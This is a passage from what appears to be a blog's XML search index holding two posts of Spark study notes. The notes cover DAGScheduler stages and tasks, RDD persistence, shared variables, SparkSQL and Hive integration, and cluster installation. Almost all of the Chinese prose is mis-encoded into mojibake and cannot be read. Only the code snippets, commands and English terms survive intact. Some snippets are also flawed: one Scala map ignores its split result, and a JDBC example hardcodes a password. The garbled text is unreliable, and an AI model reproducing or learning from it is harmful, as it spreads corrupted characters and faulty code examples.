æ­¤å¼•å…¥äº†éš”æ–­ï¼Œéœ€è¦ä¸Šä¸€ä¸ªstageå®Œæˆåï¼Œæ‰èƒ½å¾—åˆ°outputç»“æœ) Stageæœ‰ä¸¤ä¸ªå­ç±»: 1) ResultStageï¼Œç”¨äºæ‰§è¡ŒactionåŠ¨ä½œçš„æœ€ç»ˆstageã€‚ 2) ShuffleMapStage, å¯¹shuffleè¿›è¡Œè¾“å‡ºæ–‡ä»¶çš„å†™æ“ä½œçš„ã€‚å¦‚æœjobé‡ç”¨äº†åŒä¸€ä¸ªrddçš„è¯ï¼Œstageé€šå¸¸å¯ä»¥è·¨è¶Šå¤šä¸ªjobå®ç°å…±äº«ã€‚ å¹¶è¡Œä»»åŠ¡çš„é›†åˆï¼Œéƒ½ä¼šè®¡ç®—åŒä¸€å‡½æ•°ã€‚æ‰€æœ‰taskæœ‰ç€åŒæ ·çš„shuffleä¾èµ–ï¼Œè°ƒåº¦å™¨è¿è¡Œçš„task DAG åœ¨shuffleè¾¹ç•Œå¤„åˆ’åˆ†æˆä¸åŒé˜¶æ®µã€‚è°ƒåº¦å™¨ä»¥æ‹“æ‰‘é¡ºåºæ‰§è¡Œ. æ¯ä¸ªstageå¯ä»¥shuffleMapStage,è¯¥é˜¶æ®µä¸‹è¾“å‡ºæ˜¯ä¸‹ä¸€ä¸ªstageçš„è¾“å…¥ï¼Œä¹Ÿå¯ä»¥æ˜¯resultStage,è¯¥é˜¶æ®µ taskç›´æ¥æ‰§è¡Œspark actionã€‚å¯¹äºshuffleMapStageï¼Œéœ€è¦è·Ÿè¸ªæ¯ä¸ªè¾“å‡ºåˆ†åŒºæ‰€åœ¨çš„èŠ‚ç‚¹ã€‚ æ¯ä¸ªstageéƒ½æœ‰FirstJobId,åŒºåˆ†äºé¦–æ¬¡æäº¤çš„id [ShuffleMapStage] äº§ç”Ÿè¾“å‡ºæ•°æ®ï¼Œåœ¨æ¯æ¬¡shuffleä¹‹å‰å‘ç”Ÿã€‚å†…éƒ¨å«æœ‰shuffleDepå­—æ®µ,æœ‰ç›¸å…³å­—æ®µè®°å½•äº§ç”Ÿå¤šå°‘è¾“å‡ºä»¥åŠå¤šå°‘è¾“å‡ºå¯ç”¨ DAGScheduler.submitMapStage()æ–¹æ³•å¯ä»¥å•ç‹¬æäº¤submitMapStage(). [ResultStage] è¯¥é˜¶æ®µåœ¨RDDçš„ä¸€äº›åˆ†åŒºä¸­åº”ç”¨å‡½æ•°æ¥è®¡ç®—Actionçš„ç»“æœã€‚æœ‰äº›stageå¹¶ä¸ä¼šåœ¨æ‰€æœ‰åˆ†åŒºä¸Šæ‰§è¡Œã€‚ä¾‹å¦‚first(),lookup(); [Task] å•ç‹¬çš„å·¥ä½œå•å…ƒï¼Œæ¯ä¸ªå‘é€ç»™ä¸€å°ä¸»æœºã€‚ [Cache tracking] Dagè°ƒåº¦å™¨æ‰¾å‡ºå“ªäº›RDDè¢«ç¼“å­˜ï¼Œé¿å…ä¸å¿…è¦çš„é‡å¤è®¡ç®—ï¼ŒåŒæ—¶ï¼Œä¹Ÿä¼šè®°ä½å“ªäº›shuffleMapå·²ç»è¾“å‡ºäº†ç»“æœï¼Œé¿å…mapç«¯shuffleçš„é‡å¤å¤„ç†ã€‚ [Preferred locations] dagè°ƒåº¦å™¨æ ¹æ®rddçš„ä¸­é¦–é€‰ä½ç½®å±æ€§è®¡ç®—taskåœ¨å“ªé‡Œè¿è¡Œã€‚ [Cleanup] è¿è¡Œçš„jobå¦‚æœå®Œæˆå°±ä¼šæ¸…æ¥šæ•°æ®ç»“æ„é¿å…å†…å­˜æ³„æ¼ï¼Œä¸»è¦æ˜¯é’ˆå¯¹è€—æ—¶åº”ç”¨ã€‚ [ActiveJob] åœ¨Dagè°ƒåº¦å™¨ä¸­è¿è¡Œjobã€‚ä½œä¸šåˆ†ä¸ºä¸¤ç§ç±»å‹ï¼Œ 1) result jobï¼Œè®¡ç®—ResultStageæ¥æ‰§è¡Œaction. 2 )map-state job,ä¸ºshuffleMapStateç»“ç®—è®¡ç®—è¾“å‡ºç»“æœä»¥ä¾›ä¸‹æ¸¸stageä½¿ç”¨ã€‚ä¸»è¦ä½¿ç”¨finalStageå­—æ®µè¿›è¡Œç±»å‹åˆ’åˆ†ã€‚ jobåªè·Ÿè¸ªå®¢æˆ·ç«¯æäº¤çš„â€leafâ€ stageï¼Œé€šè¿‡è°ƒç”¨Dagè°ƒåº¦å™¨çš„submitjobæˆ–è€…- submitMapStage()æ–¹æ³•å®ç°. jobç±»å‹å¼•å‘ä¹‹å‰stageçš„æ‰§è¡Œï¼Œè€Œä¸”å¤šä¸ªjobå¯ä»¥å…±äº«ä¹‹å‰çš„stageã€‚è¿™äº›ä¾èµ–å…³ç³»ç”±DAGè°ƒåº¦å™¨å†…éƒ¨ç®¡ç†ã€‚ [LiveListenerBus] å¼‚æ­¥ä¼ è¾“sparkç›‘å¬äº‹ä»¶åˆ°ç›‘å¬å™¨äº‹ä»¶é›†åˆä¸­ã€‚ [EventLoop] ä»calleræ¥å—äº‹ä»¶ï¼Œåœ¨å•ç‹¬çš„äº‹ä»¶çº¿ç¨‹ä¸­å¤„ç†æ‰€æœ‰äº‹ä»¶ï¼Œè¯¥ç±»çš„å”¯ä¸€å­ç±»æ˜¯DAGSchedulerEventProcessLoopã€‚ [LiveListenerBus] ç›‘å¬å™¨æ€»çº¿ï¼Œå­˜æ”¾Sparkç›‘å¬å™¨äº‹ä»¶çš„é˜Ÿåˆ—ã€‚ç”¨äºç›‘æ§ã€‚ [OutputCommitCoordinator] è¾“å‡ºæäº¤åè°ƒå™¨.å†³å®šæäº¤çš„è¾“å‡ºæ˜¯å¦è¿›å…¥hdfsã€‚ [TaskScheduler] åº•å±‚çš„è°ƒåº¦å™¨ï¼Œå”¯ä¸€å®ç°TaskSchedulerImplã€‚å¯æ’æ‹”ï¼ŒåŒDagè°ƒåº¦å™¨æ¥å—taskï¼Œå‘é€ç»™clusterï¼Œè¿è¡Œä»»åŠ¡ï¼Œå¤±è´¥é‡è¯•ï¼Œè¿”å›äº‹ä»¶ç»™DAGè°ƒåº¦å™¨ã€‚ [TaskSchedulerImpl] TaskSchedulerè°ƒåº¦å™¨çš„å”¯ä¸€å®ç°ï¼Œé€šè¿‡BackendScheduler(åå°è°ƒåº¦å™¨)å®ç°å„ç§ç±»å‹é›†ç¾¤çš„ä»»åŠ¡è°ƒåº¦ã€‚ [SchedulerBackend] å¯æ’æ‹”çš„åå°è°ƒåº¦ç³»ç»Ÿï¼Œæœ¬åœ°è°ƒåº¦ï¼Œmesosè°ƒåº¦ï¼Œã€‚ã€‚ã€‚ åœ¨SchedulerBackendä¸‹æ–¹ï¼Œå®ç°æœ‰ä¸‰ç§ LocalSchedulerBackend æœ¬åœ°åå°è°ƒåº¦å™¨,å¯åŠ¨task. StandaloneSchedulerBackend ç‹¬ç«‹åå°è°ƒåº¦å™¨ CoarseGrainedSchedulerBackend ç²—ç²’åº¦åå°è°ƒåº¦å™¨ [Executor] sparkç¨‹åºæ‰§è¡Œè€…ï¼Œé€šè¿‡çº¿ç¨‹æ± æ‰§è¡Œä»»åŠ¡ã€‚ [Dependency]:ä¾èµ– NarrowDependency: å­RDDçš„æ¯ä¸ªåˆ†åŒºä¾èµ–äºçˆ¶RDDçš„å°‘é‡åˆ†åŒº, ä¹Ÿå«å®Œå…¨ä¾èµ– â€‹ | â€‹ / \ â€‹ â€” â€‹ |â€”- OneToOneDependency //çˆ¶å­RDDä¹‹é—´çš„åˆ†åŒºå­˜åœ¨ä¸€å¯¹ä¸€å…³ç³»ã€‚ â€‹ |â€”- RangeDependency //çˆ¶RDDçš„ä¸€ä¸ªåˆ†åŒºèŒƒå›´å’Œå­RDDå­˜åœ¨ä¸€å¯¹ä¸€å…³ç³»ã€‚ â€‹ |â€”- PruneDependency // åœ¨PartitionPruningRDDå’Œå…¶çˆ¶RDDä¹‹é—´çš„ä¾èµ–, å­RDDåŒ…å«äº†çˆ¶RDDçš„åˆ†åŒºå­é›†ã€‚ ShuffleDependency: åœ¨shuffleé˜¶æ®µè¾“å‡ºæ—¶çš„ä¸€ç§ä¾èµ–, å±äºä¸€ç§å®½ä¾èµ–, ä¹Ÿå«éƒ¨åˆ†ä¾èµ– äºŒ. Spark å…¶å®ƒæ¦‚å¿µ1. åˆ›å»º Spark ä¸Šä¸‹æ–‡(Context)[æœ¬åœ°æ¨¡å¼,é€šè¿‡çº¿ç¨‹æ¨¡æ‹Ÿ] â€‹ æœ¬åœ°åå°è°ƒåº¦å™¨ â€‹ spark local â€‹ spark local[3] //3çº¿ç¨‹,æ¨¡æ‹Ÿclusteré›†ç¾¤ â€‹ spark local[*] //åŒ¹é…cpuä¸ªæ•°ï¼Œ â€‹ spark local[3,2] //3:3ä¸ªçº¿ç¨‹ï¼Œ2ä¸ºmaxFailuresã€‚ // local[*, M] means the number of cores on the computer with M failures // local[N, M] means exactly N threads with M failures 0å’Œ1ç­‰ä»·ï¼Œåªæ‰§è¡Œä¸€æ¬¡, å¤±è´¥åä¸ä¼šé‡è¯• [ç›¸å½“äºä¼ªåˆ†å¸ƒå¼] â€‹ StandaloneSchedulerBackend â€‹ spark local-cluster[N, cores, memory] //æ¨¡æ‹Ÿsparké›†ç¾¤ã€‚ [å®Œå…¨åˆ†å¸ƒå¼] â€‹ StandaloneSchedulerBackend â€‹ spark spark://cs1:7077 //è¿æ¥åˆ°sparké›†ç¾¤ä¸Š. 2. RDD æŒä¹…åŒ– è·¨æ“ä½œè¿›è¡ŒRDDçš„å†…å­˜å¼å­˜å‚¨ã€‚ æŒä¹…åŒ–RDDæ—¶ï¼ŒèŠ‚ç‚¹ä¸Šçš„æ¯ä¸ªåˆ†åŒºéƒ½ä¼šä¿å­˜æ“å†…å­˜ä¸­,ä»¥å¤‡åœ¨å…¶ä»–æ“ä½œä¸­è¿›è¡Œé‡ç”¨ã€‚ ç¼“å­˜æŠ€æœ¯æ˜¯è¿­ä»£å¼è®¡ç®—å’Œäº¤äº’å¼æŸ¥è¯¢çš„é‡è¦å·¥å…·ã€‚ ä½¿ç”¨persist()å’Œcache()è¿›è¡Œrddçš„æŒä¹…åŒ–ã€‚ cache()æ˜¯persist()ä¸€ç§. actionç¬¬ä¸€æ¬¡è®¡ç®—æ—¶ä¼šå‘ç”Ÿpersist(). sparkçš„cacheæ˜¯å®¹é”™çš„ï¼Œå¦‚æœrddçš„ä»»ä½•ä¸€ä¸ªåˆ†åŒºä¸¢å¤±äº†ï¼Œéƒ½å¯ä»¥é€šè¿‡æœ€åˆåˆ›å»ºrddçš„è¿›è¡Œé‡æ–°è®¡ç®—ã€‚ persistå¯ä»¥ä½¿ç”¨ä¸åŒçš„å­˜å‚¨çº§åˆ«è¿›è¡ŒæŒä¹…åŒ–ã€‚ 12345678MEMORY_ONLY //åªåœ¨å†…å­˜MEMORY_AND_DISKMEMORY_ONLY_SER //å†…å­˜å­˜å‚¨(ä¸²è¡ŒåŒ–)MEMORY_AND_DISK_SER DISK_ONLY //ç¡¬ç›˜ // é»˜è®¤çš„è·¯å¾„ä¼¼ä¹åœ¨ç¨‹åºæ‰§è¡Œå®Œåè‡ªå·±ä¼šåˆ æ‰??MEMORY_ONLY_2 //å¸¦æœ‰å‰¯æœ¬ MEMORY_AND_DISK_2 //å¿«é€Ÿå®¹é”™ã€‚OFF_HEAP // ç¦»å †å†…å­˜ åˆ é™¤æŒä¹…åŒ–æ•°æ® rdd.unpersist(); 3.æ•°æ®ä¼ é€’ map(),filter()é«˜çº§å‡½æ•°ä¸­è®¿é—®çš„å¯¹è±¡è¢«ä¸²è¡ŒåŒ–åˆ°å„ä¸ªèŠ‚ç‚¹ã€‚æ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰ä¸€ä»½æ‹·è´ã€‚ å˜é‡å€¼å¹¶ä¸ä¼šå›ä¼ åˆ°driverç¨‹åºã€‚ 4.å…±äº«å˜é‡ sparké€šè¿‡å¹¿æ’­å˜é‡å’Œç´¯åŠ å™¨å®ç°å…±äº«å˜é‡ã€‚ [å¹¿æ’­å˜é‡] 123//åˆ›å»ºå¹¿æ’­å˜é‡val bc1 = sc.broadcast(Array(1,2,3))bc1.value [ç´¯åŠ å™¨] 12345// åˆ›å»ºç´¯åŠ å™¨val ac1 = sc.longaccumulator("ac1")ac1.valuesc.parallelize(1 to 10).map(_ * 2).map(e=&gt;&#123;ac1.add(1) ; e&#125;).reduce(_+_)ac1.value //10 5.é€šè¿‡ Spark å®ç° PI çš„åˆ†å¸ƒå¼è®¡ç®—:TODO è®¡ç®—å‡ºæ¥çš„ç»“æœä¸ç²¾å‡† ?? 12345678sc.parallelize(1 to 100000000).map(e=&gt;&#123; val a = 1f / (2 * e - 1) ; val b = if (e % 2 == 0) -1 else 1 ; a * b * 4&#125;).reduce(_+_)res25: Float = 3.1415968 ==&gt; ç”¨äº†ä¸€ä¸ªäº¿ç®—å‡ºæ¥è¿™ä¸ª... ä¸‰. SparkSQL Hive //hadoop mr sqlpheonix //hbaseä¹‹ä¸Šæ„å»ºsqläº¤äº’è¿‡ç¨‹DataFrame //æ”¶æ®æ¡†.è¡¨.è¯¥æ¨¡å—èƒ½åœ¨sparkè¿è¡Œsqlè¯­å¥ã€‚SparkSQL //SQL | DataFrame API. 1.Spark SQL Shell æ“ä½œ12345678910111213141516171819202122232425262728293031//åˆ›å»ºæ ·ä¾‹ç±»$scala&gt;case class Customer(id:Int,name:String,age:Int)//æ„é€ æ•°æ®$scala&gt;val arr = Array("1,tom,12","2,tomas,13","3,tomasLee,14")$scala&gt;val rdd1 = parallelize(arr)//åˆ›å»ºå¯¹è±¡rdd$scala&gt;val rdd2 = rdd1.map(e=&gt;&#123;e.split(",") ; Customer(arr(0).toInt,arr(1),arr(2).toInt)&#125;)//é€šè¿‡rddåˆ›å»ºæ•°æ®æ¡†$scala&gt;val df = spark.createDataFrame(rdd2);//æ‰“å°è¡¨ç»“æ„$scala&gt;df.printSchema$scala&gt;df.show //æ’å™æ•°æ®//åˆ›å»ºä¸´æ—¶è§†å›¾$scala&gt;df.createTempView("customers")$scala&gt;val df2 = spark.sql("select * from customers")$scala&gt;spark.sql("select * from customers").show //ä½¿ç”¨sqlè¯­å¥$scala&gt;val df1 = spark.sql("select * from cusotmers where id &lt; 2");$scala&gt;val df2 = spark.sql("select * from cusotmers where id &gt; 2");$scala&gt;df1.createTempView("c1")$scala&gt;df2.createTempView("c2")$scala&gt;spark.sql("select * from c1 union select * from c2").show$scala&gt;df1.union(df2);$scala&gt;spark.sql("select id,name from customers").show$scala&gt;df.selectExpr("id","name")$scala&gt; spark.sql("select * from cus where name like 't%' order by name desc").show$scala&gt;df.where("name like 't%'").show//æ˜ å°„$scala&gt;df.map(_.getAs[Int]("age")).reduce(_+_) //èšåˆæ“ä½œDataSet[Int]$scala&gt;df.agg(sum("age"),max("age"),min("age")) //èšåˆå‡½æ•° 2. IDEA æ“ä½œ SQLå…·ä½“æŸ¥çœ‹æˆ‘çš„ Github 1&gt; é€šè¿‡è¯»å†™æ–‡ä»¶å®ŒæˆåŸºæœ¬ SQL æ“ä½œè§æˆ‘çš„ Github ä»£ç  123456789101112131415// æºç  ==&gt; //DataFrame ç±»ä¼¼äºtableæ“ä½œã€‚type DataFrame = Dataset[Row]1&gt; é€šè¿‡RDDåˆ›å»º DataFrame df = sc.createDataFrame(rdd);2&gt; DataFrame è½¬å›ä¸º RDD JavaRDD&lt;Row&gt; rdd = df1.toJavaRDD();3&gt; SparkSession å¯¹è±¡,é€šè¿‡è¯»å– json æ–‡ä»¶, åˆ›å»º DataSet Dataset&lt;Row&gt; df = session.read().json("file:///tmp/test.json");4&gt; ä¿å­˜sparkçš„sqlè®¡ç®—ç»“æœä¸º json æ–‡ä»¶ //ä¿å­˜æˆjsonæ–‡ä»¶ã€‚ æ¨¡å¼ä¸ºæ·»åŠ æ¨¡å¼ df.write().mode(SaveMode.Append).json("file://...") 2&gt; é€šè¿‡ JDBC æ“ä½œ MySQL æ·»åŠ  pom ä¾èµ– mysql-connector-java 12345&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.17&lt;/version&gt;&lt;/dependency&gt; ç¼–å†™ä»£ç , è§æˆ‘çš„ Github 3.æ•´åˆ Hive1.é…ç½® &amp; Spark-shell æ“ä½œ1234567891011121314151617181920211&gt; .hiveçš„ç±»åº“éœ€è¦åœ¨spark workerèŠ‚ç‚¹ã€‚----------------------------------------------------------------------------------2&gt; .å¤åˆ¶hive-site.xml(hive) åˆ° spark/confä¸‹ã€‚----------------------------------------------------------------------------------(core-site.xml(hdfs) + hdfs-site.xml(hdfs) å°±ä¸ç”¨å¤åˆ¶äº†, åœ¨ conf/spark-env.sh ä¸­, é…ç½®äº† HADOOP_CONF_DIR å°±å¯ä»¥äº†)3&gt; .å¤åˆ¶mysqlé©±åŠ¨ç¨‹åºåˆ°/soft/spark/jarsä¸‹ (Hive çš„ metadata å­˜åœ¨ mysql)----------------------------------------------------------------------------------4&gt; .å¯åŠ¨spark-shell,æŒ‡å®šå¯åŠ¨æ¨¡å¼----------------------------------------------------------------------------------spark-shell --master local[4]# åˆ›å»º Hive è¡¨$scala&gt;create table tt(id int,name string , age int) row format delimited fields terminated by ',' lines terminated by '\n' stored as textfile//åŠ è½½æ•°æ®åˆ°hiveè¡¨$scala&gt;spark.sql("load data local inpath 'file:///home/centos/data.txt' into table mydb.tt"); 2. Javaç‰ˆSparkSQL æ“ä½œ Hive è¡¨æ‰€æœ‰çš„ pom æ–‡ä»¶é…ç½® 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.hive&lt;/groupId&gt; &lt;artifactId&gt;hive-jdbc&lt;/artifactId&gt; &lt;version&gt;2.1.0&lt;/version&gt;&lt;/dependency&gt; Java ä»£ç  è¯¦ç»†ä»£ç è§github 12345678910SparkConf conf = new SparkConf();conf.setMaster("local") ;conf.setAppName("SQLJava");SparkSession sess = SparkSession.builder() .appName("HiveSQLJava") .config("spark.master","local") .getOrCreate();Dataset&lt;Row&gt; df = sess.sql("create table mytt(id int)");df.show(); 3. Sparkä¸‹ åˆ†å¸ƒå¼è®¿é—® Hive (Spark-Shell) â€”â€“ å¼€å¯thriftserver, é€šè¿‡ beeline è®¿é—® hive12345678910111213141516171819201&gt; åœ¨é»˜è®¤åº“ä¸‹åˆ›å»ºhiveçš„æ•°æ®è¡¨ã€‚ $&gt;hive -e "create table tt(id int,name string , age int) row format delimited fields terminated by ',' lines terminated by '\n' stored as textfile"2&gt; åŠ è½½æ•°æ®åˆ°hiveè¡¨ä¸­. $&gt;hive -e "load data local inpath 'file:///home/ap/stu' into table tt" $&gt;hive -e "select * from tt"3&gt; å¯åŠ¨ thriftserver æœåŠ¡å™¨ # å¯åŠ¨ thriftServer [ap@cs1]~/apps/spark/sbin%&gt; start-thriftserver.sh --master spark://cs1:7077 # æŸ¥çœ‹ netstat -anop | grep 10000 4&gt; å¯åŠ¨ beeline # è¿æ¥beeline, è®°å¾—ä¸€å®šè¦åŠ ä¸Šç”¨æˆ·å!!!! -n ap # ä¸‹é¢çš„æƒ…å†µæ˜¯, cs1æ˜¯è£…äº† hive çš„ [ap@cs1]~/apps/spark%&gt; bin/beeline -u jdbc:hive2://localhost:10000 -n ap -d org.apache.hive.jdbc.HiveDriver5&gt; æ¥ä¸‹æ¥, è·Ÿç›´æ¥åœ¨hive ä¸­, é€šè¿‡ beeline è®¿é—® hive, æ˜¯ä¸€æ ·çš„æ“ä½œ, å°±æ˜¯ç›´æ¥æ“ä½œ hive 4. ä½¿ç”¨ Java é€šè¿‡ ThreadServer, ä½¿ç”¨ JDBC è®¿é—® Hiveè¯¦æƒ…çœ‹ä»£ç  123456789101112131415Class.forName("org.apache.hive.jdbc.HiveDriver");Connection conn = DriverManager.getConnection("jdbc:hive2://cs1:10000","ap","123");Statement st = conn.createStatement();ResultSet rs = st.executeQuery("select * from tt where age &gt; 12 ORDER BY age DESC ");while (rs.next()) &#123; int id = rs.getInt(1); String name = rs.getString(2); int age = rs.getInt(3); System.out.println(id + "," + name + "," + age);&#125;rs.close();]]></content>
      <categories>
        <category>Spark</category>
        <category>SparkSQL</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Spark</tag>
        <tag>SparkSQL</tag>
        <tag>Sparkæºç </tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i-Spark-1]]></title>
    <url>%2F2018%2F07%2F20%2FSpark%2Fi-Spark-1%2F</url>
    <content type="text"><![CDATA[Tips: å¹¶è¡Œ é›†ç¾¤è®¡ç®—ã€‚ å¹¶è¡Œè®¡ç®—ã€‚ ç¡¬ä»¶æ–¹é¢çš„æ¦‚å¿µ å¹¶å‘ å¹¶å‘æ‰§è¡Œã€‚ çº¿ç¨‹æ–¹é¢çš„æ¦‚å¿µ ä¸€. Spark ç®€ä»‹1.æ¦‚å¿µLightning-fast cluster computingã€‚ å¿«å¦‚é—ªç”µçš„é›†ç¾¤è®¡ç®—ã€‚ å¤§è§„æ¨¡å¿«é€Ÿé€šç”¨çš„è®¡ç®—å¼•æ“ã€‚ é€Ÿåº¦: æ¯”hadoop 100x,ç£ç›˜è®¡ç®—å¿«10x ä½¿ç”¨: java / Scala /R /python â€‹ æä¾›80+ç®—å­(æ“ä½œç¬¦)ï¼Œå®¹æ˜“æ„å»ºå¹¶è¡Œåº”ç”¨ã€‚ é€šç”¨: ç»„åˆSQL ï¼Œæµè®¡ç®— + å¤æ‚åˆ†æã€‚ DAG: direct acycle graph,æœ‰å‘æ— ç¯å›¾ã€‚ Spark ä¸ MR å…³ç³»: åŸºäºhadoopçš„mrï¼Œæ‰©å±•MRæ¨¡å‹é«˜æ•ˆä½¿ç”¨MRæ¨¡å‹ï¼Œå†…å­˜å‹é›†ç¾¤è®¡ç®—ï¼Œæé«˜appå¤„ç†é€Ÿåº¦ã€‚ 2.Spark æ¨¡å— Spark core //æ ¸å¿ƒæ¨¡å— ,é€šç”¨æ‰§è¡Œå¼•æ“ï¼Œæä¾›å†…å­˜è®¡ç®—å’Œå¯¹å¤–éƒ¨æ•°æ®é›†çš„å¼•ç”¨ã€‚RDD Spark SQL //SQL ,æ„å»ºåœ¨coreä¹‹ä¸Šï¼Œå¼•å…¥æ–°çš„æŠ½è±¡SchemaRDDï¼Œæä¾›äº†ç»“æ„åŒ–å’ŒåŠç»“æ„åŒ–æ”¯æŒã€‚ Spark Streaming //æµè®¡ç®— DStream Spark MLlib //æœºå™¨å­¦ä¹  Spark graph //å›¾è®¡ç®— 3.RDDæ˜¯sparkçš„åŸºæœ¬æ•°æ®ç»“æ„ï¼Œæ˜¯ä¸å¯å˜æ•°æ®é›†ã€‚ RDDä¸­çš„æ•°æ®é›†è¿›è¡Œé€»è¾‘åˆ†åŒºï¼Œæ¯ä¸ªåˆ†åŒºå¯ä»¥å•ç‹¬åœ¨é›†ç¾¤èŠ‚ç‚¹è¿›è¡Œè®¡ç®—ã€‚ å¯ä»¥åŒ…å«ä»»ä½•java,scalaï¼Œpythonå’Œè‡ªå®šä¹‰ç±»å‹ã€‚ RDDæ˜¯åªè¯»çš„è®°å½•åˆ†åŒºé›†åˆã€‚RDDå…·æœ‰å®¹é”™æœºåˆ¶ã€‚ åˆ›å»ºRDDæ–¹å¼: 1)å¹¶è¡ŒåŒ–ä¸€ä¸ªç°æœ‰é›†åˆ. 2) ç”±å¦ä¸€ä¸ª RDD è½¬æ¢ hadoop èŠ±è´¹90%æ—¶é—´ read, writeã€‚ å†…å­˜å¤„ç†è®¡ç®—ã€‚åœ¨jobé—´è¿›è¡Œæ•°æ®å…±äº«ã€‚å†…å­˜çš„IOé€Ÿç‡é«˜äºç½‘ç»œå’Œdiskçš„10 ~ 100ä¹‹é—´ã€‚ 4. Spark RDD å†…éƒ¨åŒ…å«5ä¸ªä¸»è¦å±æ€§ åˆ†åŒºåˆ—è¡¨ é’ˆå¯¹æ¯ä¸ªsplitçš„è®¡ç®—å‡½æ•°ã€‚ å¯¹å…¶ä»–rddçš„ä¾èµ–åˆ—è¡¨ å¯é€‰ï¼Œå¦‚æœæ˜¯KeyValueRDDçš„è¯ï¼Œå¯ä»¥å¸¦åˆ†åŒºç±»ã€‚ å¯é€‰ï¼Œé¦–é€‰å—ä½ç½®åˆ—è¡¨(hdfs block location); äºŒ. Spark å®‰è£…1. localæ¨¡å¼1234567891011121314151617181920211).ä¸‹è½½spark-2.1.3-bin-hadoop2.7.tgz2).è§£å‹åˆ°/home/ap/apps åˆ›å»ºç¬¦å·è¿æ¥ : ln -s spark-2.1.3-bin-hadoop2.7 spark3).ç¯å¢ƒå˜é‡ [.zshrc] SPARK_HOME=/home/ap/apps/spark PATH=$PATH:$SPARK_HOME/bin:$SPARK_HOME/sbin [source] $&gt;source ~/.zshrc4).éªŒè¯spark $&gt;cd apps/spark/sbin $&gt;./spark-shell5).webui http://cs1:4040/ # PS : å¯åŠ¨æœ¬åœ°æ¨¡å¼,ç™»å½•4040 webUIç«¯å£, åªéœ€è¦å¯åŠ¨spark-shell. è¦æŠŠmaster æˆ–è€… worker å…³æ‰ 2. Stand alone åˆ†å¸ƒå¼123456789101112131415161718192021222324252627282930313233341). é…ç½®å…¶ä»–ä¸»æœºçš„æ‰€æœ‰ç¯å¢ƒå˜é‡, å‘é€cs1ä¸Šçš„.zshrc åˆ°å…¶å®ƒæœºå™¨-------------------- # å‘é€ &lt;sub&gt;&gt; xsync.sh &lt;/sub&gt;/.zshrc # source &lt;sub&gt;&gt; xcall.sh "source &lt;/sub&gt;/.zshrc"2). é…ç½®masterèŠ‚ç‚¹çš„slaves-------------------- [/soft/spark/conf/slaves] cs2 cs3 cs4 cs53). å‘é€æ–‡ä»¶åˆ°å…¶å®ƒèŠ‚ç‚¹-------------------- ~&gt; xsync.sh apps/spark4). å¯åŠ¨sparké›†ç¾¤-------------------- ~&gt; apps/spark/sbin/start-all.sh5). æŸ¥çœ‹è¿›ç¨‹-------------------- $&gt;xcall.jps jps master //cs1 worker //cs2 worker //cs3 worker //cs46). æŸ¥çœ‹ webUI-------------------- http://cs1:8080 3. Stand alone HA æ¨¡å¼ è§„åˆ’: cs1, cs6 ä¸º master cs2~cs5 ä¸º worker 12345678910111213141516171819202122232425262728291). é…ç½® HADOOP_CONF_DIR, ç›®çš„æ˜¯æ‰¾åˆ° hdfs-site.xml å’Œ core-site.xml--------------# conf/spark-env.sh ä¸­---------------- # é… HADOOP_CONF_DIR, è¿™æ ·å°±ä¸ç”¨æ‹·è´hdfs-site.xml å’Œ core-site.xml åˆ° conf ç›®å½•äº† export HADOOP_CONF_DIR=$HADOOP_HOME/etc/hadoop ps: ä¹Ÿå¯ä»¥ç›´æ¥å¤åˆ¶ hdfs-site.xml å’Œ core-site.xml åˆ° spark/conf ä¸‹, å¯èƒ½è¿˜å¾—åœ¨ conf/defaults.confä¸­æŒ‡å®š spark.files file:///home/ap/apps/spark/conf/hdfs-site.xml,file:///home/ap/apps/spark/conf/core-site.xml ,ä½†æ˜¯ä¸æ¨èè¿™æ ·2). é…ç½® JAVA_HOME &amp; zookeeper--------------# conf/spark-env.sh ä¸­---------------- export JAVA_HOME=/usr/local/jdk1.8.0_73 export SPARK_DAEMON_JAVA_OPTS="-Dspark.deploy.recoveryMode=ZOOKEEPER -Dspark.deploy.zookeeper.url=cs1,cs2,cs3 -Dspark.deploy.zookeeper.dir=/spark"3) åˆ†å‘æ•´ä¸ª conf ç›®å½•æ–‡ä»¶åˆ°é›†ç¾¤------------------------------------------------$cs1 &lt;sub&gt;&gt; xsync.sh &lt;/sub&gt;/apps/spark/conf4) å¯åŠ¨é›†ç¾¤------------------------------------------------cs1&gt; ~/apps/spark/sbin/start-all.shcs6&gt; ~/apps/spark/sbin/start-master.shæŸ¥çœ‹&gt; http://cs1:8080http://cs6:80805) æµ‹è¯•: å¯åŠ¨spark-shell,è¿æ¥sparké›†ç¾¤ä¸Š------------------------------------------------ $&gt; spark-shell --master spark://cs1:7077$&gt; sc.textFile("hdfs://mycluster/user/ap/a.txt").collect(); 4. Spark å†å²æœåŠ¡å™¨(å¯é€‰)1234567891011121314151617181920212223242526ç¬¬ä¸€æ­¥ï¼š------------------------------------------------ cd /home/hadoop/apps/spark-2.3.0-bin-hadoop2.7/confcp spark-defaults.conf.template spark-defaults.confåœ¨æ–‡ä»¶é‡Œé¢æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼šspark.eventLog.enabled truespark.eventLog.dir hdfs://mycluster/sparklogç¬¬äºŒæ­¥ï¼š------------------------------------------------ åœ¨ spark-env.sh çš„æ–‡ä»¶é‡Œé¢æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼šexport SPARK_HISTORY_OPTS="-Dspark.history.ui.port=18080 -Dspark.history.retainedApplications=30 -Dspark.history.fs.logDirectory=hdfs://mycluster/sparklog"ç¬¬ä¸‰æ­¥ï¼š------------------------------------------------ åœ¨å¯åŠ¨ HistorServer æœåŠ¡ä¹‹å‰ hdfs://mycluster/sparklog ç›®å½•è¦æå‰åˆ›å»ºhadoop fs -mkdir -p hdfs://mycluster/sparklogç¬¬å››æ­¥ï¼šå¯åŠ¨ Spark HistoryServer------------------------------------------------ $&gt; SPARK_HOME/sbin/start-history-server.shç¬¬äº”æ­¥ï¼šè®¿é—® Spark History WebUI------------------------------------------------ http://cs1:18080/ 5. yarn æ¨¡å¼â€¦ ä¸‰. Spark ç®€å•ä½“éªŒ1. API[SparkContext] 